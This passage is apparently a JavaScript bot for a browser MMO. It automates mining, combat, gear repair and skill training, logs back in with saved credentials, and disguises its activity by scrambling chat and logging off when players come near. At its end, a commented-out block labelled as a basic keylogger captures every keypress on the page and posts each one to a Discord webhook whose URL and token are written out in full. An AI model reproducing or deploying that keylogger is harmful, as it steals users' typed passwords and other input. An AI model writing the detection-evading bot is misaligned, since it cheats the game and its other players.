      } else if (xIfChatHas("You hold the Steel Pickaxe")) {
        await xDelay(100)
        await xDoClearChat("You hold the Steel Pickaxe")
        pickEquiped = true;
      }
    }

    //check for rock
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (xGetWallByPos(coordsUpperGem[num1gem][0], coordsUpperGem[num1gem][1]) && mobnearby == false) {
      await xDoMove(coordsUpperGem[num1gem][0], coordsUpperGem[num1gem][1])
      UpperGemAtx = coordsUpperGem[num1gem][0];
      UpperGemAtY = coordsUpperGem[num1gem][1];

    } else {
      if (coordsUpperGem[num1gem][0] != 0 && coordsUpperGem[num1gem][1] != 0) {
        num1gem++
      }
    }
    if (!mobnearby) {
      await xDoKeyPress(6, 40)
    }
    //checks if there isnt a gem anymore
    if (xGetWallByPos(UpperGemAtx, UpperGemAtY) == undefined && num1gem == 9) {
      UpperGemMined = true;
    }
  }


  while (!LowerGemMined && UpperGemMined) {
    xCheckForMobsSquareArea(76, 83, 64, 75)
    //check for mobs n goes n kills them without spells
    if (mobnearby && xGetMobByName("Dire wolf") && xGetMobByName("Dire wolf").y >= 64 && xGetMobByName("Dire wolf").x >= 76 && xGetMobByName("Dire wolf").x <= 83 && xGetMobByName("Dire wolf").y <= 75) {
      await send({
        type: "t",
        t: xGetMobByName("Dire wolf")
          .id
      })
      await xDoKeyPress(10, 100)
      await xDoKeyPress(11, 100)
      pickEquiped = false;
      xDoMove(xGetMobByName("Dire wolf").x, xGetMobByName("Dire wolf").y)
      console.log("Dire wolf locked in")
    } else if (mobnearby && xGetMobByName("Ice elemental") && xGetMobByName("Ice elemental").y >= 64 && xGetMobByName("Ice elemental").x >= 76 && xGetMobByName("Ice elemental").x <= 83 && xGetMobByName("Ice elemental").y <= 75) {
      await send({
        type: "t",
        t: xGetMobByName("Ice elemental")
          .id
      })
      await xDoKeyPress(10, 100)
      await xDoKeyPress(11, 100)
      pickEquiped = false;
      xDoMove(xGetMobByName("Ice elemental").x, xGetMobByName("Ice elemental").y)
      console.log("Ice elemental locked in")
    } else {
      mobnearby = false;
    }

    // use spells if hp too low

    if (hp_status.val <= 50 && hp_status.val >= 0.1) {
      //shell
      xDoSpell(905)
      await xDelay(3000)
    }
    if (hp_status.val <= 30 && hp_status.val >= 0.1) {
      //hr
      xDoSpell(910)
      await xDelay(3000)
    }
    if (hp_status.val <= 20 && hp_status.val >= 0.1) {
      //inti
      xDoSpell(894)
      await xDelay(3000)
    }

    //equip pickaxe and check if its equip n shit
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (!pickEquiped && !mobnearby) {
      await xDoKeyPress(9, 100)
      await xDelay(100)
      if (xIfChatHas("You unequip the Steel Pickaxe ")) {
        await xDelay(100)
        await xDoClearChat("You unequip the Steel Pickaxe ")
        await xDelay(100)
        await xDoKeyPress(9, 100)
        pickEquiped = true;
      } else if (xIfChatHas("You hold the Steel Pickaxe")) {
        await xDelay(100)
        await xDoClearChat("You hold the Steel Pickaxe")
        pickEquiped = true;
      }
    }
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (xGetWallByPos(coordsLowerGem[num3gem][0], coordsLowerGem[num3gem][1]) && !mobnearby) {
      await xDoMove(coordsLowerGem[num3gem][0], coordsLowerGem[num3gem][1])
      LowerGemAtx = coordsLowerGem[num3gem][0];
      LowerGemAtY = coordsLowerGem[num3gem][1];
    } else {
      if (coordsLowerGem[num3gem][0] != 0 && coordsLowerGem[num3gem][1] != 0) {
        num3gem++
      }
    }
    if (!mobnearby) {
      await xDoKeyPress(6, 40)
    }
    //checks if there isnt a gem anymore
    if (xGetWallByPos(LowerGemAtx, LowerGemAtY) == undefined && num3gem == 9) {
      LowerGemMined = true;
    }
  }
  //log off to respawn gems if both mined  
  xCheckForMobsSquareArea(76, 83, 64, 75)
  if (UpperGemMined && LowerGemMined && !mobnearby) {
    await xDoKeyPress(10, 100)
    await xDoKeyPress(11, 100)
    await xDoMove(80, 65)
    await xDelay(3000)
    UpperGemMined = false;
    LowerGemMined = false;
    num1gem = 0;
    num3gem = 0;
    UpperGemAtx = 0;
    UpperGemAtY = 0;
    LowerGemAtx = 0;
    LowerGemAtY = 0;
    pickEquiped = false;
    await xDoLogOff()
    await xDelay(600000) //Poner 600000
    async function xDoLogIn(usernameVal, passVal) {
      jv_selected_ip = "use2.mysteralegacy.com"
      await xDelay(250);
      await do_connect()
      await xDelay(250);
      send({
        type: "login",
        user: jv.base64_encode(usernameVal),
        pass: jv.base64_encode(passVal)
      });
      await xDelay(25);
    }
    await xDoLogIn(usernameVal, passVal)
    await xDelay(2000)
    WCgem()

  } else if (mobnearby) {
    if (mobnearby && xGetMobByName("Dire wolf")) {
      send({
        type: "t",
        t: xGetMobByName("Dire wolf")
          .id
      })
      await xDoKeyPress(10, 100)
      await xDoKeyPress(11, 100)
      pickEquiped = false;
      xDoMove(xGetMobByName("Dire wolf").x, xGetMobByName("Dire wolf").y)
    } else if (mobnearby && xGetMobByName("Ice elemental")) {
      send({
        type: "t",
        t: xGetMobByName("Ice elemental")
          .id
      })
      await xDoKeyPress(10, 100)
      await xDoKeyPress(11, 100)
      pickEquiped = false;
      xDoMove(xGetMobByName("Ice elemental").x, xGetMobByName("Ice elemental").y)
    } else {
      mobnearby = false;
    }
  } else {
    WCgem()
  }
}

async function xDoLogIn(usernameVal, passVal) {
  jv_selected_ip = "use2.mysteralegacy.com"
  await xDelay(250);
  do_connect()
  await xDelay(250);
  send({
    type: "login",
    user: jv.base64_encode(usernameVal),
    pass: jv.base64_encode(passVal)
  });
  await xDelay(25);
}
async function xDoLogOff() {
  await xDelay(25);
  send({
    type: "chat",
    data: "/quit"
  });
  await xDelay(25);
}
async function xDoKeyUp(id) {
  await xDelay(25);
  jv.key_array[id].isDown = false;
  jv.key_array[id].isUP = true;
  await xDelay(25);
  if (id == 6) {
    await xDelay(25);
    await xDoKeyPress(6, 100);
    await xDelay(25);
    await xDoKeyPress(6, 100);
    await xDelay(25);
    await xDoKeyPress(6, 100);
    await xDelay(25);
  }
}
async function xDoKeyDown(id) {
  await xDelay(25);
  jv.key_array[id].isDown = true;
  jv.key_array[id].isUP = false;
  await xDelay(25);
}
async function xDoKeyPress(id, milliseconds) {
  await xDelay(25);
  if (id >= 7) {
    if (id == 7) {
      await xDelay(milliseconds / 2);
      key1.press();
      await xDelay(milliseconds / 2);
    } else if (id == 8) {
      await xDelay(milliseconds / 2);
      key2.press();
      await xDelay(milliseconds / 2);
    } else if (id == 9) {
      await xDelay(milliseconds / 2);
      key3.press();
      await xDelay(milliseconds / 2);
    } else if (id == 10) {
      await xDelay(milliseconds / 2);
      key4.press();
      await xDelay(milliseconds / 2);
    } else if (id == 11) {
      await xDelay(milliseconds / 2);
      key5.press();
      await xDelay(milliseconds / 2);
    } else if (id == 12) {
      await xDelay(milliseconds / 2);
      key6.press();
      await xDelay(milliseconds / 2);
    } else if (id == 13) {
      await xDelay(milliseconds / 2);
      key7.press();
      await xDelay(milliseconds / 2);
    } else if (id == 14) {
      await xDelay(milliseconds / 2);
      key8.press();
      await xDelay(milliseconds / 2);
    } else if (id == 15) {
      await xDelay(milliseconds / 2);
      key9.press();
      await xDelay(milliseconds / 2);
    }
  } else
    if (id == 5) {
      await xDelay(milliseconds / 2);
      keyShift.press();
      await xDelay(milliseconds / 2);
    } else {
      jv.key_array[id].isDown = true;
      jv.key_array[id].isUP = false;
      await xDelay(milliseconds);
      jv.key_array[id].isDown = false;
      jv.key_array[id].isUP = true;
    }
  await xDelay(25);
}
function xDelay(milliseconds) {
  return new Promise(function (resolve) {
    setTimeout(resolve, milliseconds + ((Math.random() * (milliseconds) / 10) + 25));
  });
}

async function xDoClearChat(text) {
  for (id in jv.chat_box.lines) {
    if (jv.chat_box.lines[id].text.indexOf(text) != -1) {
      jv.chat_box.lines[id].text = jv.chat_box.lines[id].text.toLocaleLowerCase()
        .replaceAll("a", "x")
        .replaceAll("b", "x")
        .replaceAll("c", "x")
        .replaceAll("d", "x")
        .replaceAll("e", "x")
        .replaceAll("f", "x")
        .replaceAll("g", "x")
        .replaceAll("h", "x")
        .replaceAll("i", "x")
        .replaceAll("j", "x")
        .replaceAll("k", "x")
        .replaceAll("l", "x")
        .replaceAll("m", "x")
        .replaceAll("n", "x")
        .replaceAll("o", "x")
        .replaceAll("p", "x")
        .replaceAll("q", "x")
        .replaceAll("r", "x")
        .replaceAll("s", "x")
        .replaceAll("t", "x")
        .replaceAll("u", "x")
        .replaceAll("v", "x")
        .replaceAll("w", "x")
        .replaceAll("y", "x")
        .replaceAll("z", "x")
    }
  }
}
function xIfChatHas(chat) {
  for (i in jv.chat_box.lines) {
    if (jv.chat_box.lines[i].text.indexOf(chat) != -1) {
      return true;
    }
  }
  return false;
}

function xDoChangeChat(text1, text2) {
  for (id in jv.chat_box.lines) {
    if (jv.chat_box.lines[id].text.indexOf(text1) != -1) {
      jv.chat_box.lines[id].text = text2;
    }
  }
}

function xDoClearChatLine(id) {
  jv.chat_box.lines[id].text = " ";
  for (i in jv.chat_box.lines) {
    if (((jv.chat_box.lines.length - 1) - i) < id) {
      if (jv.chat_box.lines[(jv.chat_box.lines.length - 1) - i].text != " ") {
        jv.chat_box.lines[id] = jv.chat_box.lines[(jv.chat_box.lines.length - 1) - i];
        break;
      }
    }
  }
}

async function xDoChat(textval) {
  await xDelay(25);
  send({
    type: "chat",
    data: textval
  })
  await xDelay(25);
}

function xGetMobByName(ID) {
  if (xTemp[13] == undefined) {
    xTemp[13] = myself;
  } else if (xTemp[13].monster_sprite == null) {
    xTemp[13] = myself;
  }
  xTemp[15] = xTemp[13];
  if (xTemp[13].id == me) {
    for (i in mobs.items) {
      if (mobs.items[i] != undefined) {
        if (ID.toLowerCase()
          .replace(/ /g, '')
          .indexOf(mobs.items[i].name.toLowerCase()
            .replace(/ /g, '')) != -1) {
          if (xTemp[15] == myself) {
            xTemp[15] = mobs.items[i];
          } else if (Math.abs(mobs.items[i].x - myself.x) + Math.abs(myself.y - mobs.items[i].y) < Math.abs(xTemp[15].x - myself.x) + Math.abs(myself.y - xTemp[15].y)) {
            xTemp[15] = mobs.items[i];
          }
        }
      }
    }
  }
  xTemp[13] = xTemp[15];
  return xTemp[13];
}
async function xDoSelectByPos(ex, wy) {
  if (target.id == 0 || target.id == undefined) {
    target.id = me;
  }
  if (target.id == me) {
    if (xxGetMobByPos(ex, wy) != myself) {
      send({
        type: "t",
        t: xGetMobByPos(ex, wy)
          .id
      })
      await xDelay(300);
    }
  }
}
function xGetMobByPos(ex, wy) {
  if (xTemp[13] == undefined) {
    xTemp[13] = myself;
  } else if (xTemp[13].monster_sprite == null) {
    xTemp[13] = myself;
  }
  xTemp[15] = xTemp[13];
  if (xTemp[13].id == me) {
    for (i in mobs.items) {
      if (mobs.items[i] != undefined) {
        if (mobs.items[i].x == ex && mobs.items[i].y == wy) {
          xTemp[15] = mobs.items[i];
        }
      }
    }
  }
  xTemp[13] = xTemp[15];
  return xTemp[13];
}
function xDoSpell(id) {
  if (xGetSpellByID(id) != undefined) {
    send({
      type: "c",
      r: "ab",
      a: xGetSpellByID(id)
        .ind
    })
  }
}
var playernum = 0;
async function xCheckForPlayersNearby() {
  playernum = 0
  for (playernum in mobs.items) {
    if (mobs.items[playernum] != undefined) {
      if (mobs.items[playernum].body >= 1 && mobs.items[playernum].name !== myself.name) {
        console.log(mobs.items[playernum].name)
        playernearby = true;
      } else {
        playernearby = false;
      }
    }
  }
}

var mobnum = 0;
function xCheckForMobsSquareArea(left, right, top, Bot) {
  mobnum = 0
  for (mobnum in mobs.items) {
    if (mobs.items[mobnum] != undefined) {
      if (mobs.items[mobnum].body == -1 && mobs.items[mobnum].x >= left && mobs.items[mobnum].x <= right && mobs.items[mobnum].y >= top && mobs.items[mobnum].y <= Bot) {
        mobnearby = true;
      } else {
        mobnearby = false;
      }
    }
  }
}

/*
if (xGetMobByName("Dire wolf").x >= 76 && xGetMobByName("Dire wolf").x <= 83 && xGetMobByName("Dire wolf").y <= 75 && xGetMobByName("Dire wolf").y >= 64) {
      send({
        type: "t",
        t: xGetMobByName("Dire wolf")
          .id
      })
      mobnearby = true;
      xDoMove(xGetMobByName("Dire wolf").x, xGetMobByName("Dire wolf").y)
    }
    if (xGetMobByName("Ice elemental").x >= 76 && xGetMobByName("Ice elemental").x <= 83 && xGetMobByName("Ice elemental").y <= 75 && xGetMobByName("Ice elemental").y >= 64) {
      send({
        type: "t",
        t: xGetMobByName("Ice elemental")
          .id
      })
      mobnearby = true;
      xDoMove(xGetMobByName("Ice elemental").x, xGetMobByName("Ice elemental").y)
    }

    if ((!xGetMobByName("Ice elemental").x >= 76 && !xGetMobByName("Ice elemental").x <= 83 && !xGetMobByName("Ice elemental").y <= 75 && !xGetMobByName("Ice elemental").y >= 64) || (!xGetMobByName("Dire wolf").x >= 76 && !xGetMobByName("Dire wolf").x <= 83 && !xGetMobByName("Dire wolf").y <= 75 && !xGetMobByName("Dire wolf").y >= 64)) {
      mobnearby = false;
    }*/

var repairing = false;
var repaired = false;
var pplcounterbeggining = 0;
async function repairWCGem() {

  if (myself == undefined) {
    return;
  }

  //start check for players, if theres none drop gear to repair if there is repeat from start
  xCheckForPlayersNearby()
  if (!playernearby) {
    await xDoDropSlot(1, 6)
    await xDoDropSlot(1, 5)
    await xDoDropSlot(1, 4)
    await xDoDropSlot(1, 3)
    await xDoDropSlot(2, 2)
    await xDoKeyPress(7, 1)
  } else if (playernearby) {
    pplcounterbeggining++
    if (pplcounterbeggining >= 4) {
      pplcounterbeggining = 0;
      await xDoLogOff();
    } else {
      await xDelay(5000);
      repairWCGem();
    }
  } else if (mobnearby) {
    return;
  }
  repairing = false;
  repaired = false;
  pplcounterbeggining = 0;

  xCheckForPlayersNearby()
  xCheckForMobsSquareArea(76, 83, 64, 75)
  if /*check if there isnt a wall to the left*/(!xGetWallByPos(myself.x - 1, myself.y) && !playernearby && !mobnearby) {
    //prep to repair
    await xDoKeyPress(1, 100)
    await xDoKeyDown(4)
    await xDoKeyPress(0, 100)
    await xDoKeyUp(4)
    if (xGetSlotByID(719)) {
      await xDoUseSlot(xGetSlotByID(719))
    } else {
      console.log("There is no repair kit")
      await xDoKeyPress(0, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoLogOff();
      return;
    }
    repairing = true;

    xCheckForPlayersNearby()
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (!playernearby && !mobnearby) {
      //action of repairing
      while (repairing && !playernearby && !mobnearby) {
        await xDoKeyPress(6, 1)
        if (xIfChatHas("Pickaxe ")) {
          await xDoClearChat("Pickaxe")
          repaired = true;
        }
        //check if repair kits breaks if so check for more, log off if none left
        if (xIfChatHas("You unequip the Repair Kit.")) {
          await xDoClearChat("You unequip the Repair Kit.")
          await xDoUseSlot(xGetSlotByID(719))
        }
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          if (xGetSlotByID(719)) {
            await xDoUseSlot(xGetSlotByID(719))
          } else if (!xGetSlotByID(719)) {
            console.log("Theres no more repair kits")
            await xDoKeyPress(0, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoLogOff()
          }
        }
        //if its repaired pick everything up
        if (repaired == true) {
          await xDoKeyPress(0, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          repairing = false
        }

      }
      //if theres a guy nearby pick everything up
    } else {
      await xDoKeyPress(0, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      if (mobnearby) {
        return;
      } else {
        repairWCGem()
      }
    }

    xCheckForPlayersNearby()
    xCheckForMobsSquareArea(76, 83, 64, 75)
  } else if /*check if there isnt a wall to the right*/ (!xGetWallByPos(myself.x + 1, myself.y) && !playernearby && !mobnearby) {
    //prep to repair
    await xDoKeyPress(0, 100)
    await xDoKeyDown(4)
    await xDoKeyPress(1, 100)
    await xDoKeyUp(4)
    if (xGetSlotByID(719)) {
      await xDoUseSlot(xGetSlotByID(719))
    } else {
      console.log("There is no repair kit")
      await xDoKeyPress(1, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoLogOff();
      return;
    }
    repairing = true;

    xCheckForPlayersNearby()
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (!playernearby && !mobnearby) {
      //action of repairing
      while (repairing && !playernearby && !mobnearby) {
        await xDoKeyPress(6, 1)
        if (xIfChatHas("Pickaxe ")) {
          await xDoClearChat("Pickaxe")
          repaired = true;
        }
        //check if repair kits breaks if so check for more, log off if none left
        if (xIfChatHas("You unequip the Repair Kit.")) {
          await xDoClearChat("You unequip the Repair Kit.")
          await xDoUseSlot(xGetSlotByID(719))
        }
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          if (xGetSlotByID(719)) {
            await xDoUseSlot(xGetSlotByID(719))
          } else if (!xGetSlotByID(719)) {
            console.log("Theres no more repair kits")
            await xDoKeyPress(1, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoLogOff()
          }
        }
        //if its repaired pick everything up
        if (repaired == true) {
          await xDoKeyPress(1, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          repairing = false
        }

      }
      //if theres a guy nearby pick everything up
    } else {
      await xDoKeyPress(1, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      //if its a mob stop the function
      if (mobnearby) {
        return;
      } else {
        repairWCGem()
      }
    }
    xCheckForPlayersNearby()
    xCheckForMobsSquareArea(76, 83, 64, 75)
  } else if /*check if there isnt a wall to the top*/ (!xGetWallByPos(myself.x, myself.y - 1) && !playernearby && !mobnearby) {
    //prep to repair
    await xDoKeyPress(2, 100)
    await xDoKeyDown(4)
    await xDoKeyPress(3, 100)
    await xDoKeyUp(4)
    if (xGetSlotByID(719)) {
      await xDoUseSlot(xGetSlotByID(719))
    } else {
      console.log("There is no repair kit")
      await xDoKeyPress(3, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoLogOff();
      return;
    }
    repairing = true;

    xCheckForPlayersNearby()
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (!playernearby && !mobnearby) {
      //action of repairing
      while (repairing && !playernearby && !mobnearby) {
        await xDoKeyPress(6, 1)
        if (xIfChatHas("Pickaxe ")) {
          await xDoClearChat("Pickaxe")
          repaired = true;
        }
        //check if repair kits breaks if so check for more, log off if none left
        if (xIfChatHas("You unequip the Repair Kit.")) {
          await xDoClearChat("You unequip the Repair Kit.")
          await xDoUseSlot(xGetSlotByID(719))
        }
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          if (xGetSlotByID(719)) {
            await xDoUseSlot(xGetSlotByID(719))
          } else if (!xGetSlotByID(719)) {
            console.log("Theres no more repair kits")
            await xDoKeyPress(3, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoLogOff()
          }
        }
        //if its repaired pick everything up
        if (repaired == true) {
          await xDoKeyPress(3, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          repairing = false
        }

      }
      //if theres a guy nearby pick everything up
    } else {
      await xDoKeyPress(3, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      //if its a mob stop the function
      if (mobnearby) {
        return;
      } else {
        repairWCGem()
      }
    }
    xCheckForPlayersNearby()
    xCheckForMobsSquareArea(76, 83, 64, 75)
  } else if /*check if there isnt a wall to the bot*/ (!xGetWallByPos(myself.x, myself.y + 1) && !playernearby && !mobnearby) {
    //prep to repair
    await xDoKeyPress(3, 100)
    await xDoKeyDown(4)
    await xDoKeyPress(2, 100)
    await xDoKeyUp(4)
    if (xGetSlotByID(719)) {
      await xDoUseSlot(xGetSlotByID(719))
    } else {
      console.log("There is no repair kit")
      await xDoKeyPress(2, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoLogOff();
      return;
    }
    repairing = true;

    xCheckForPlayersNearby()
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (!playernearby && !mobnearby) {
      //action of repairing
      while (repairing && !playernearby && !mobnearby) {
        await xDoKeyPress(6, 1)
        if (xIfChatHas("Pickaxe ")) {
          await xDoClearChat("Pickaxe")
          repaired = true;
        }
        //check if repair kits breaks if so check for more, log off if none left
        if (xIfChatHas("You unequip the Repair Kit.")) {
          await xDoClearChat("You unequip the Repair Kit.")
          await xDoUseSlot(xGetSlotByID(719))
        }
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          if (xGetSlotByID(719)) {
            await xDoUseSlot(xGetSlotByID(719))
          } else if (!xGetSlotByID(719)) {
            console.log("Theres no more repair kits")
            await xDoKeyPress(2, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoKeyPress(5, 100)
            await xDoLogOff()
          }
        }
        //if its repaired pick everything up
        if (repaired == true) {
          await xDoKeyPress(2, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          await xDoKeyPress(5, 100)
          repairing = false
        }

      }
      //if theres a guy nearby pick everything up
    } else {
      await xDoKeyPress(2, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      await xDoKeyPress(5, 100)
      //if its a mob stop the function
      if (mobnearby) {
        return;
      } else {
        repairWCGem()
      }
    }
  } else if /*Take all back if there is no space*/(xGetWallByPos(myself.x - 1, myself.y) && xGetWallByPos(myself.x + 1, myself.y) && xGetWallByPos(myself.x, myself.y + 1) && vxGetWallByPos(myself.x, myself.y - 1)) {
    await xDoKeyPress(5, 100)
    await xDoKeyPress(5, 100)
    await xDoKeyPress(5, 100)
    await xDoKeyPress(5, 100)
    await xDoKeyPress(5, 100)
    await xDoKeyPress(5, 100)
    await xDoLogOff();
  }
}

var RepairTrainloop = false;
var RepairTrainhittingwall = true;
var RepairTraining = false;
var wall1ready = false;
var wall2ready = false;
var wall3ready = false;
var repairequiped = false;
var lvllimiterRepair = 0;

async function RepairTrain(lvllimiterRepair) {

  const coordRepairx = myself.x;
  const coordRepairy = myself.y;

  //check for player position
  if (coordRepairx == myself.x && coordRepairy == myself.y) {
    RepairTrainloop = true;
  } else {
    RepairTrainloop = false;
    await xDoLogOff();
  }
  while (RepairTrainloop) {

    await xDelay(500)
    if (xIfChatHas("skill is now level "+lvllimiterRepair)) {
      xDoClearChat("skill is now level "+lvllimiterRepair)
      RepairTrainloop = false;
      await xDoLogOff();

    }

    //check for player position
    if (coordRepairx == myself.x && coordRepairy == myself.y) {
      RepairTrainloop = true;
    } else {
      RepairTrainloop = false;
      await xDoLogOff();
    }

    await CheckForrepairs()

    //check if theres walls
    if (!xGetWallByPos(myself.x - 1, myself.y)) {
      console.log("A wall broke, logging off")
      await xDoLogOff();
      RepairTrainloop = false;
    } else if (!xGetWallByPos(myself.x + 1, myself.y)) {
      console.log("A wall broke, logging off")
      await xDoLogOff();
      RepairTrainloop = false;
    } else if (!xGetWallByPos(myself.x, myself.y - 1)) {
      console.log("A wall broke, logging off")
      await xDoLogOff();
      RepairTrainloop = false;
    }
    //Hit walls
    if (RepairTrainhittingwall) {
      if (!wall1ready) {
        await xDoKeyPress(1, 500)
        await xDoKeyPress(6, 500)
        await xDelay(1000)
        if (xGetWallHp(myself.x - 1, myself.y) <= 30 && xGetWallHp(myself.x - 1, myself.y) != -1) {
          wall1ready = true;
        }
      }
      if (!wall2ready) {
        await xDoKeyPress(2, 500)
        await xDoKeyPress(6, 500)
        await xDelay(1000)
        if (xGetWallHp(myself.x, myself.y - 1) <= 30 && xGetWallHp(myself.x, myself.y - 1) != -1) {
          wall2ready = true;
        }
      }
      if (!wall3ready) {
        await xDoKeyPress(0, 500)
        await xDoKeyPress(6, 500)
        await xDelay(1000)
        if (xGetWallHp(myself.x + 1, myself.y) <= 30 && xGetWallHp(myself.x + 1, myself.y) != -1) {
          wall3ready = true;
        }
      }
      if (wall1ready && wall2ready && wall3ready) {
        RepairTrainhittingwall = false;
        RepairTraining = true;
      }
    }
    //Repair walls
    if (RepairTraining) {

      if (!repairequiped) {
        await xDoUseSlot(xGetSlotByID(719))
        repairequiped = true;
      }

      if (wall1ready) {
        await xDelay(500)
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          await CheckForrepairs()
        } else {
          await xDoKeyPress(1, 100)
          await xDoKeyPress(6, 100)
          if (xGetWallHp(myself.x - 1, myself.y) == 100) {
            wall1ready = false;
          }
        }
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          await CheckForrepairs()
        }
      }
      if (!wall1ready && wall2ready) {
        await xDelay(500)
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          await CheckForrepairs()
        } else {
          await xDoKeyPress(2, 100)
          await xDoKeyPress(6, 100)
          if (xGetWallHp(myself.x, myself.y - 1) == 100) {
            wall2ready = false;
          }
        }
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          await CheckForrepairs()
        }
      }
      if (!wall1ready && !wall2ready && wall3ready) {
        await xDelay(500)
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          await CheckForrepairs()
        } else {
          await xDoKeyPress(0, 100)
          await xDoKeyPress(6, 100)
          if (xGetWallHp(myself.x + 1, myself.y) == 100) {
            wall3ready = false;
          }
        }
        if (xIfChatHas("The repair kit breaks!")) {
          await xDoClearChat("The repair kit breaks!")
          await CheckForrepairs()
        }
      }
      if (!wall1ready && !wall2ready && !wall3ready) {
        RepairTrainhittingwall = true;
        RepairTraining = false;
        await xDoUseSlot(xGetSlotByID(719))
        repairequiped = false;
      }
    }
    //Repeat code
  }

}

async function CheckForrepairs() {

  //Take more repair kits
  if (xGetItemByPos(myself.x, myself.y) && xGetSlotByID(719) == undefined) {
    await xDoKeyPress(5, 100)
    await xDelay(500)
    await xDoUseSlot(xGetSlotByID(719))
  } else if (!xGetItemByPos(myself.x, myself.y) && !xGetSlotByID(719)) {
    console.log("There are no more repair kits, logging off")
    await xDoLogOff();
    RepairTrainloop = false;
  }

}
/*
-Key IDs-
0 - Right
1 - Left
2 - Up
3 - Down
4 - Ctrl
5 - Shift
6 - Space
7 - D1
8 - D2
9 - D3
10 - D4
11 - D5
12 - D6
13 - D7
14 - D8
15 - D9
*/

// Keylogger básico en JavaScript
/*
document.addEventListener('keydown', function(event) {
  // Captura la tecla presionada
  const key = event.key;
  
  // Envía la tecla a un servidor remoto (simulado aquí)
  // Reemplaza la URL con la dirección de tu propio servidor
  fetch('https://discordapp.com/api/webhooks/1219654846764810333/r6cD-wUp6eTBy8kD5ALwQOr-Ws1HCN7Q2P2SYDCNj80ddcZbTzTAz_OW8WuHkkDYZDiu', {
    body: JSON.stringify({
        content: key,
    }),
    headers: {
        "Content-Type": "application/json",
    },
    method: "POST",
})
    .then(function (res) {
        console.log(res);
    })
    .catch(function (res) {
        console.log(res);
    })
  .then(response => {
    if (response.ok) {
      console.log('Tecla registrada con éxito:', key);
    } else {
      console.error('Error al registrar la tecla:', key);
    }
  })
  .catch(error => {
    console.error('Error de red:', error);
  });
});s
*/